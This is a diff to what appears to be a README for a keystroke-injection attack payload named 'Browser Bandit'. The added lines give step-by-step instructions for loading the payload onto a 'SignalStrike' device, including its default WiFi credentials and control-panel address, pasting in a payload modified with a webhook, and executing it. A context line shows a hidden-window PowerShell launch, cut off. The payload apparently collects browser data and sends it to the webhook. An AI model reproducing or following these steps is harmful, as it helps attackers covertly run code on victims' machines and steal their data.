@@ -45,8 +45,12 @@ STRING Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -C
 ENTER
 ```
 
+3. Upload Your Payload to SignalStrike
 
-
-
-test
+    Plug in your SignalStrike device.
+    Connect to its WiFi network (Default SSID: SignalStrike, Password: SignalStrike).
+    Open a web browser and go to 192.168.4.1 to access the control panel.
+    Create a new payload and name it "Browser Bandit".
+    Paste your modified Payload.txt (with the webhook) into the text box provided.
+    Save the payload and execute it.
 
